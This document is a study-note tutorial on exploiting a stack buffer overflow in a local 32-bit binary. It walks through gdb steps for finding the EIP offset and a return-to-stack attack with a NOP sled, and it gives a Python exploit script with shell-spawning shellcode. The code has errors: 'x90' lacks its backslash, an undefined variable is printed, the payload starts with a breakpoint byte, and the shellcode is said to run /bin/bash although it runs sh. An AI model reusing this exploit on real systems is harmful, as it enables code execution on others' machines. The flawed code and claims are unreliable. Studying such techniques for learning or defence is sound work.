Here I explain how you can Find **vulnerability & exploit** it for Stack Buffer Overflow

**Offset:** distance from the first A to the 4 A's that overwrite EIP is commonly called the offset. (all the random characters from first to before EIP filled)

**Filling Flow: Stack -> EBP -> EIP**
# Static-Analyze

```
0. readelf -s ./elf | grep FUNC  -> Finding Functions inside program

1. objdump -d -M intel elf | less

2. strings ./elf
```
# Dynamic-Analyze
Here We debug Using `gdb -q ./elf` & write exploit using **python2 or 3 script**
### Finding vulnerability
We Try to crash the program using python (generate random charecters)
#### STDIN 
```
python -c "print('A'*5000)" | ./elf
```
#### Arguments
```
./elf $(python -c "print('A'*5000)")
```

### Finding The Offset of Instruction Pointer (EIP)

First We place a break point at the leave instruction

0. Send bunch of 'A's (not too much to crash the program) like 50 or 40 to the program
1. print 2 hex of EBP: ```x/2x $ebp``` (We need the second one)
2. print 50 hex of stack: ```x/50x $esp```
3. Find Second EBP value (got from step 1) inside the stack **(the second one inside stack if available)**
4. subtract the address of Stack where EBP value is at From the address where 'A's are started Inside the Stack.




## Return To The STACK & Execute Shell Code

0. Fill the Offset using a padding: ```padding="A"*X``` (We got X number from the above tutorial)
**if EBP didn't filled with 'A's then it's not enought yet**
1. first set breakpoint  at ret instruction using `br *<ret address>`
2. Pickup $ESP value from `info register` and then `eip = struct.pack("I", <ESP address>)`
3. send some nop `nop = "x90"*100` (mostly 100 is enough)
4. Add 40 or more to the stack(ESP) address (from step 2) `eip = struct.pack("I", 0xbffff7c0+40` because we want to jump on NOP instructions so our exploit will be **reliable**
5. Now you can place our shell codes after NOP instructions
```
payload = "\xCC\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```
**This Shell Code Execute /bin/bash for us**
We should have a python script like this:
```
import struct
padding = "A" * 74
eip = struct.pack("I", 0xbffff7c0+40)
nop = "x90" * 100
payload = "\xCC\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print(padding+ebp+eip+nop+payload)
```
**if it didn't work we can debug it using Opcode CC (INT 3) `\xCC` So Instead of payload `payload = '\xCC'*4` and see if the program give `breakpoint/trace` Error if it didn't then there is a problem with your `Offset number` OR `ESP Address that you want to return to (eip variable in our script)`**

What is Opcode CC? It's a Debugging Instruction that make CPU stop before next instruction (breakpoint/trace)
